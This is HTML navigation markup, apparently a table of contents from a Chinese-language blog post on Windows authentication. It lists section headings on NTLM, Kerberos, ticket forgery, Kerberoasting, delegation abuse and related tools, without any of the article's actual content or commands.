class="nav-number">5.2.</span> <span class="nav-text">Windows Access Token组成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token-%E2%80%93-SID-Security-Identifiers-%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6"><span class="nav-number">5.3.</span> <span class="nav-text">Windows Access Token – SID (Security Identifiers)安全标识符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token%E4%BA%A7%E7%94%9F%E8%BF%87%E7%A8%8B"><span class="nav-number">5.4.</span> <span class="nav-text">Windows Access Token产生过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92%E5%AE%9E%E6%88%98"><span class="nav-number">5.5.</span> <span class="nav-text">Windows Access Token令牌假冒实战</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92%E9%98%B2%E5%BE%A1"><span class="nav-number">5.6.</span> <span class="nav-text">Windows Access Token令牌假冒防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#From-%E5%80%BE%E6%97%8B"><span class="nav-number">6.</span> <span class="nav-text">From 倾旋</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos%E7%AF%87%E8%A1%A5%E5%85%85"><span class="nav-number">7.</span> <span class="nav-text">Kerberos篇补充</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberos%E6%B5%81%E7%A8%8B%E5%86%8D%E5%A4%8D%E4%B9%A0"><span class="nav-number">7.1.</span> <span class="nav-text">Kerberos流程再复习</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AS-REQ-amp-AS-REP%E5%BC%95%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">7.2.</span> <span class="nav-text">AS_REQ &amp; AS_REP引出的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Pass-the-hash"><span class="nav-number">7.2.1.</span> <span class="nav-text">1. Pass the hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="nav-number">7.2.2.</span> <span class="nav-text">2. 用户名枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Password-Spraying"><span class="nav-number">7.2.3.</span> <span class="nav-text">3. Password Spraying</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-AS-REP-Roasting"><span class="nav-number">7.2.4.</span> <span class="nav-text">4. AS-REP Roasting</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">7.2.5.</span> <span class="nav-text">5. 黄金票据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">7.2.6.</span> <span class="nav-text">工具</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#getTGT"><span class="nav-number">7.2.6.1.</span> <span class="nav-text">getTGT</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#GetNPUsers"><span class="nav-number">7.2.6.2.</span> <span class="nav-text">GetNPUsers</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ticketer"><span class="nav-number">7.2.6.3.</span> <span class="nav-text">ticketer</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Rubeus"><span class="nav-number">7.2.6.4.</span> <span class="nav-text">Rubeus</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Mimikatz"><span class="nav-number">7.2.6.5.</span> <span class="nav-text">Mimikatz</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#kerberos-golden"><span class="nav-number">7.2.6.5.1.</span> <span class="nav-text">kerberos::golden</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DomainPasswordSpray"><span class="nav-number">7.2.6.6.</span> <span class="nav-text">DomainPasswordSpray</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TGS-REQ-amp-TGS-REP"><span class="nav-number">7.3.</span> <span class="nav-text">TGS_REQ &amp; TGS_REP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#TGS-REQ"><span class="nav-number">7.3.1.</span> <span class="nav-text">TGS_REQ</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-msg-type"><span class="nav-number">7.3.1.1.</span> <span class="nav-text">1. msg-type</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-PA-DATA"><span class="nav-number">7.3.1.2.</span> <span class="nav-text">2. PA-DATA</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-REQ-BODY"><span class="nav-number">7.3.1.3.</span> <span class="nav-text">3. REQ_BODY</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TGS-REP"><span class="nav-number">7.3.2.</span> <span class="nav-text">TGS_REP</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-msg-type-1"><span class="nav-number">7.3.2.1.</span> <span class="nav-text">1. msg-type</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-ticket"><span class="nav-number">7.3.2.2.</span> <span class="nav-text">2. ticket</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-Enc-part"><span class="nav-number">7.3.2.3.</span> <span class="nav-text">3. Enc_part</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#S4U2SELF"><span class="nav-number">7.4.</span> <span class="nav-text">S4U2SELF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#S4U2PROXY"><span class="nav-number">7.5.</span> <span class="nav-text">S4U2PROXY</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PAC%E4%BB%8B%E7%BB%8D"><span class="nav-number">7.6.</span> <span class="nav-text">PAC介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PAC%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98MS14-068"><span class="nav-number">7.7.</span> <span class="nav-text">PAC安全问题MS14-068</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="nav-number">7.7.1.</span> <span class="nav-text">工具：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#kekeo"><span class="nav-number">7.7.1.1.</span> <span class="nav-text">kekeo</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#impacket"><span class="nav-number">7.7.1.2.</span> <span class="nav-text">impacket</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-pykek"><span class="nav-number">7.7.1.3.</span> <span class="nav-text">3. pykek</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TGS-REQ-amp-TGS-REP%E5%BC%95%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">7.8.</span> <span class="nav-text">TGS_REQ &amp; TGS_REP引出的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-number">7.8.1.</span> <span class="nav-text">白银票据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Kerberoasting"><span class="nav-number">7.8.2.</span> <span class="nav-text">Kerberoasting</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SPN%E7%AE%80%E4%BB%8B"><span class="nav-number">7.8.2.1.</span> <span class="nav-text">SPN简介</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SPN%E6%A0%BC%E5%BC%8F"><span class="nav-number">7.8.2.2.</span> <span class="nav-text">SPN格式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SPN%E6%9F%A5%E8%AF%A2"><span class="nav-number">7.8.2.3.</span> <span class="nav-text">SPN查询</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#kerberoasting"><span class="nav-number">7.8.2.4.</span> <span class="nav-text">kerberoasting</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.</span> <span class="nav-text">委派</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.1.</span> <span class="nav-text">域委派</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.2.</span> <span class="nav-text">非约束委派</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.2.1.</span> <span class="nav-text">设置非约束性委派</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E7%9A%84%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E8%AE%BE%E7%BD%AE"><span class="nav-number">7.9.2.1.1.</span> <span class="nav-text">机器账户的非约束性委派设置</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7%E7%9A%84%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E8%AE%BE%E7%BD%AE"><span class="nav-number">7.9.2.1.2.</span> <span class="nav-text">服务账户的非约束委派设置</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%86%85%E8%AE%BE%E7%BD%AE%E4%BA%86%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7"><span class="nav-number">7.9.2.1.3.</span> <span class="nav-text">查询域内设置了非约束委派的服务账户</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%86%85%E8%AE%BE%E7%BD%AE%E4%BA%86%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7"><span class="nav-number">7.9.2.1.4.</span> <span class="nav-text">查询域内设置了非约束委派的机器账户</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F1"><span class="nav-number">7.9.3.</span> <span class="nav-text">非约束委派利用方式1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F2%EF%BC%88Spooler%E6%89%93%E5%8D%B0%E6%9C%BA%E6%9C%8D%E5%8A%A1%EF%BC%89"><span class="nav-number">7.9.4.</span> <span class="nav-text">非约束委派利用方式2（Spooler打印机服务）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.5.</span> <span class="nav-text">约束性委派</span></a></li></ol></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81"><span class="nav-number">2.</span> <span class="nav-text">本地认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">2.1.</span> <span class="nav-text">本地认证基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-NT-LAN-Manager-Hash"><span class="nav-number">2.2.</span> <span class="nav-text">NTLM(NT LAN Manager) Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-Hash%E4%B8%8ENTLM"><span class="nav-number">2.3.</span> <span class="nav-text">NTLM Hash与NTLM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-Hash%E7%9A%84%E4%BA%A7%E7%94%9F"><span class="nav-number">2.4.</span> <span class="nav-text">NTLM Hash的产生</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="nav-number">2.5.</span> <span class="nav-text">本地认证流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LM-Hash"><span class="nav-number">2.6.</span> <span class="nav-text">LM Hash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81"><span class="nav-number">3.</span> <span class="nav-text">网络认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.1.</span> <span class="nav-text">NTLM 协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-%E6%8C%91%E6%88%98-Response-%E5%93%8D%E5%BA%94"><span class="nav-number">3.2.</span> <span class="nav-text">Challenge(挑战)&#x2F;Response(响应)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-V2%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.3.</span> <span class="nav-text">NTLM V2协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM%E5%8D%8F%E8%AE%AE%E5%BB%B6%E4%BC%B8"><span class="nav-number">3.4.</span> <span class="nav-text">NTLM协议延伸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pass-The-Hash"><span class="nav-number">3.5.</span> <span class="nav-text">Pass The Hash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81"><span class="nav-number">4.</span> <span class="nav-text">Kerberos域认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Active-Directory-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-%E6%A6%82%E5%BF%B5"><span class="nav-number">4.1.</span> <span class="nav-text">Active Directory(活动目录)概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Active-Directory-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-%E5%8A%9F%E8%83%BD"><span class="nav-number">4.2.</span> <span class="nav-text">Active Directory(活动目录)功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB-Kerbroes"><span class="nav-number">4.3.</span> <span class="nav-text">域认证体系 - Kerbroes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%89%80%E5%8F%82%E4%B8%8E%E7%9A%84%E8%A7%92%E8%89%B2"><span class="nav-number">4.4.</span> <span class="nav-text">域认证所参与的角色</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%89%80%E5%8F%82%E4%B8%8E%E7%9A%84%E8%A7%92%E8%89%B2%EF%BC%88KDC%EF%BC%89"><span class="nav-number">4.5.</span> <span class="nav-text">域认证所参与的角色（KDC）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E7%B2%97%E7%95%A5%E6%B5%81%E7%A8%8B"><span class="nav-number">4.6.</span> <span class="nav-text">域认证粗略流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E8%AF%A6%E7%BB%86%E6%B5%81%E7%A8%8B"><span class="nav-number">4.7.</span> <span class="nav-text">域认证详细流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Tickets"><span class="nav-number">4.8.</span> <span class="nav-text">白银票据(Silver Tickets)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Tickets"><span class="nav-number">4.9.</span> <span class="nav-text">伪造白银票据(Silver Tickets)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Tickets-%E9%98%B2%E5%BE%A1"><span class="nav-number">4.10.</span> <span class="nav-text">白银票据(Silver Tickets)防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-Tickets"><span class="nav-number">4.11.</span> <span class="nav-text">黄金票据(Golden Tickets)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-Tickets-MSF-kiwi"><span class="nav-number">4.12.</span> <span class="nav-text">黄金票据(Golden Tickets)-MSF kiwi</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-Tickets-%E4%BC%AA%E9%80%A0"><span class="nav-number">4.13.</span> <span class="nav-text">黄金票据(Golden Tickets) - 伪造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tickets-%E6%80%BB%E7%BB%93"><span class="nav-number">4.14.</span> <span class="nav-text">Tickets 总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-Access-Token"><span class="nav-number">5.</span> <span class="nav-text">Windows Access Token</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token-%E7%AE%80%E4%BB%8B"><span class="nav-number">5.1.</span> <span class="nav-text">Windows Access Token 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token%E7%BB%84%E6%88%90"><span class="nav-number">5.2.</span> <span class="nav-text">Windows Access Token组成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token-%E2%80%93-SID-Security-Identifiers-%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6"><span class="nav-number">5.3.</span> <span class="nav-text">Windows Access Token – SID (Security Identifiers)安全标识符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token%E4%BA%A7%E7%94%9F%E8%BF%87%E7%A8%8B"><span class="nav-number">5.4.</span> <span class="nav-text">Windows Access Token产生过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92%E5%AE%9E%E6%88%98"><span class="nav-number">5.5.</span> <span class="nav-text">Windows Access Token令牌假冒实战</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92%E9%98%B2%E5%BE%A1"><span class="nav-number">5.6.</span> <span class="nav-text">Windows Access Token令牌假冒防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#From-%E5%80%BE%E6%97%8B"><span class="nav-number">6.</span> <span class="nav-text">From 倾旋</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos%E7%AF%87%E8%A1%A5%E5%85%85"><span class="nav-number">7.</span> <span class="nav-text">Kerberos篇补充</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberos%E6%B5%81%E7%A8%8B%E5%86%8D%E5%A4%8D%E4%B9%A0"><span class="nav-number">7.1.</span> <span class="nav-text">Kerberos流程再复习</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AS-REQ-amp-AS-REP%E5%BC%95%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">7.2.</span> <span class="nav-text">AS_REQ &amp; AS_REP引出的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Pass-the-hash"><span class="nav-number">7.2.1.</span> <span class="nav-text">1. Pass the hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="nav-number">7.2.2.</span> <span class="nav-text">2. 用户名枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Password-Spraying"><span class="nav-number">7.2.3.</span> <span class="nav-text">3. Password Spraying</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-AS-REP-Roasting"><span class="nav-number">7.2.4.</span> <span class="nav-text">4. AS-REP Roasting</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">7.2.5.</span> <span class="nav-text">5. 黄金票据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">7.2.6.</span> <span class="nav-text">工具</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#getTGT"><span class="nav-number">7.2.6.1.</span> <span class="nav-text">getTGT</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#GetNPUsers"><span class="nav-number">7.2.6.2.</span> <span class="nav-text">GetNPUsers</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ticketer"><span class="nav-number">7.2.6.3.</span> <span class="nav-text">ticketer</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Rubeus"><span class="nav-number">7.2.6.4.</span> <span class="nav-text">Rubeus</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Mimikatz"><span class="nav-number">7.2.6.5.</span> <span class="nav-text">Mimikatz</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#kerberos-golden"><span class="nav-number">7.2.6.5.1.</span> <span class="nav-text">kerberos::golden</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DomainPasswordSpray"><span class="nav-number">7.2.6.6.</span> <span class="nav-text">DomainPasswordSpray</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TGS-REQ-amp-TGS-REP"><span class="nav-number">7.3.</span> <span class="nav-text">TGS_REQ &amp; TGS_REP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#TGS-REQ"><span class="nav-number">7.3.1.</span> <span class="nav-text">TGS_REQ</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-msg-type"><span class="nav-number">7.3.1.1.</span> <span class="nav-text">1. msg-type</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-PA-DATA"><span class="nav-number">7.3.1.2.</span> <span class="nav-text">2. PA-DATA</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-REQ-BODY"><span class="nav-number">7.3.1.3.</span> <span class="nav-text">3. REQ_BODY</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TGS-REP"><span class="nav-number">7.3.2.</span> <span class="nav-text">TGS_REP</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-msg-type-1"><span class="nav-number">7.3.2.1.</span> <span class="nav-text">1. msg-type</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-ticket"><span class="nav-number">7.3.2.2.</span> <span class="nav-text">2. ticket</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-Enc-part"><span class="nav-number">7.3.2.3.</span> <span class="nav-text">3. Enc_part</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#S4U2SELF"><span class="nav-number">7.4.</span> <span class="nav-text">S4U2SELF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#S4U2PROXY"><span class="nav-number">7.5.</span> <span class="nav-text">S4U2PROXY</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PAC%E4%BB%8B%E7%BB%8D"><span class="nav-number">7.6.</span> <span class="nav-text">PAC介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PAC%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98MS14-068"><span class="nav-number">7.7.</span> <span class="nav-text">PAC安全问题MS14-068</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="nav-number">7.7.1.</span> <span class="nav-text">工具：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#kekeo"><span class="nav-number">7.7.1.1.</span> <span class="nav-text">kekeo</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#impacket"><span class="nav-number">7.7.1.2.</span> <span class="nav-text">impacket</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-pykek"><span class="nav-number">7.7.1.3.</span> <span class="nav-text">3. pykek</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TGS-REQ-amp-TGS-REP%E5%BC%95%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">7.8.</span> <span class="nav-text">TGS_REQ &amp; TGS_REP引出的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-number">7.8.1.</span> <span class="nav-text">白银票据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Kerberoasting"><span class="nav-number">7.8.2.</span> <span class="nav-text">Kerberoasting</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SPN%E7%AE%80%E4%BB%8B"><span class="nav-number">7.8.2.1.</span> <span class="nav-text">SPN简介</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SPN%E6%A0%BC%E5%BC%8F"><span class="nav-number">7.8.2.2.</span> <span class="nav-text">SPN格式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SPN%E6%9F%A5%E8%AF%A2"><span class="nav-number">7.8.2.3.</span> <span class="nav-text">SPN查询</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#kerberoasting"><span class="nav-number">7.8.2.4.</span> <span class="nav-text">kerberoasting</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.</span> <span class="nav-text">委派</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.1.</span> <span class="nav-text">域委派</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.2.</span> <span class="nav-text">非约束委派</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.2.1.</span> <span class="nav-text">设置非约束性委派</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E7%9A%84%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E8%AE%BE%E7%BD%AE"><span class="nav-number">7.9.2.1.1.</span> <span class="nav-text">机器账户的非约束性委派设置</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7%E7%9A%84%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E8%AE%BE%E7%BD%AE"><span class="nav-number">7.9.2.1.2.</span> <span class="nav-text">服务账户的非约束委派设置</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%86%85%E8%AE%BE%E7%BD%AE%E4%BA%86%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7"><span class="nav-number">7.9.2.2.</span> <span class="nav-text">查询域内设置了非约束委派的服务账户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%86%85%E8%AE%BE%E7%BD%AE%E4%BA%86%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7"><span class="nav-number">7.9.2.3.</span> <span 